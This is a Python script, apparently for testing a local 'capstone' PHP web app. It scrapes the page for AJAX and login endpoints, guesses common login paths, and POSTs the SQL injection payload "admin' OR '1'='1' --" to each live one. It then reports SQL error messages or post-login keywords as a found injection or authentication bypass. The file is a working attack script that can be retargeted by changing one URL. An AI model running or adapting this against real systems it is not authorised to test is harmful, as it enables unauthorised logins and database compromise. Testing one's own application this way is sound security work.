#!/usr/bin/env python3
import requests
import re
import json

def test_capstone_forms():
    base_url = "http://localhost/capstone/"
    
    print(f"[*] Testing {base_url}")
    
    try:
        # Get the main page
        response = requests.get(base_url, timeout=5)
        print(f"[*] Status code: {response.status_code}")
        print(f"[*] Content length: {len(response.text)} characters")
        
        # Look for AJAX/API endpoints in JavaScript
        print("\n[*] Looking for AJAX/API endpoints...")
        
        # Common patterns for AJAX calls
        ajax_patterns = [
            r'\.post\(["\']([^"\']+)["\']',
            r'\.get\(["\']([^"\']+)["\']',
            r'ajax\([^}]*url[^:]*:[^"\']*["\']([^"\']+)["\']',
            r'fetch\(["\']([^"\']+)["\']',
            r'XMLHttpRequest.*open\([^,]*,[^"\']*["\']([^"\']+)["\']'
        ]
        
        endpoints = []
        for pattern in ajax_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            endpoints.extend(matches)
        
        # Remove duplicates and clean up
        endpoints = list(set([ep for ep in endpoints if ep and not ep.startswith('http')]))
        
        if endpoints:
            print(f"[*] Found potential AJAX endpoints: {endpoints}")
        
        # Look for login-related endpoints specifically
        login_patterns = [
            r'["\']([^"\']*login[^"\']*\.php)["\']',
            r'["\']([^"\']*auth[^"\']*\.php)["\']',
            r'["\']([^"\']*signin[^"\']*\.php)["\']'
        ]
        
        login_endpoints = []
        for pattern in login_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            login_endpoints.extend(matches)
        
        login_endpoints = list(set(login_endpoints))
        if login_endpoints:
            print(f"[*] Found login endpoints: {login_endpoints}")
        
        # Test common login endpoints
        test_login_endpoints = [
            "/capstone/login.php",
            "/capstone/auth.php",
            "/capstone/signin.php",
            "/capstone/user/login.php",
            "/capstone/admin/login.php",
            "/capstone/api/login.php"
        ]
        
        # Add discovered endpoints
        for endpoint in login_endpoints:
            if not endpoint.startswith('/'):
                endpoint = '/capstone/' + endpoint
            test_login_endpoints.append(endpoint)
        
        print(f"\n[*] Testing {len(test_login_endpoints)} potential login endpoints...")
        
        for endpoint in test_login_endpoints:
            test_url = f"http://localhost{endpoint}"
            try:
                test_response = requests.get(test_url, timeout=3)
                if test_response.status_code == 200:
                    print(f"[+] Active endpoint: {test_url}")
                    
                    # Try a basic SQL injection test
                    test_sql_on_endpoint(test_url)
                    
            except:
                pass
        
        # Look for forms in the current page (including hidden ones)
        form_pattern = r'<form[^>]*>(.*?)</form>'
        forms = re.findall(form_pattern, response.text, re.DOTALL | re.IGNORECASE)
        print(f"\n[*] Found {len(forms)} forms on main page")
        
        if forms:
            for i, form in enumerate(forms):
                print(f"Form {i+1}: {form[:100]}...")

    except Exception as e:
        print(f"[!] Error: {str(e)}")

def test_sql_on_endpoint(url):
    """Test SQL injection on a specific endpoint"""
    print(f"[*] Testing SQL injection on: {url}")
    
    # Common login parameters
    test_params = [
        {'username': "admin' OR '1'='1' --", 'password': 'test'},
        {'user': "admin' OR '1'='1' --", 'pass': 'test'},
        {'email': "admin' OR '1'='1' --", 'password': 'test'},
        {'login': "admin' OR '1'='1' --", 'pwd': 'test'}
    ]
    
    for params in test_params:
        try:
            # Test POST request
            response = requests.post(url, data=params, timeout=3)
            
            # Check for SQL errors or successful login indicators
            response_text = response.text.lower()
            
            sql_errors = [
                'sql syntax', 'mysql_fetch', 'warning: mysql',
                'ora-', 'microsoft ole db', 'odbc sql',
                'sqlserver jdbc', 'sqlite3.operationalerror',
                'unexpected end of sql command'
            ]
            
            success_indicators = [
                'welcome', 'dashboard', 'logout', 'admin panel',
                'successful', 'authenticated', 'profile'
            ]
            
            for error in sql_errors:
                if error in response_text:
                    print(f"[!] Possible SQL injection vulnerability detected!")
                    print(f"    Error: {error}")
                    print(f"    Parameters: {params}")
                    return
            
            for indicator in success_indicators:
                if indicator in response_text:
                    print(f"[!] Possible authentication bypass!")
                    print(f"    Success indicator: {indicator}")
                    print(f"    Parameters: {params}")
                    return
                    
        except:
            continue
    
    print(f"[*] No obvious SQL injection found on {url}")

if __name__ == "__main__":
    test_capstone_forms()
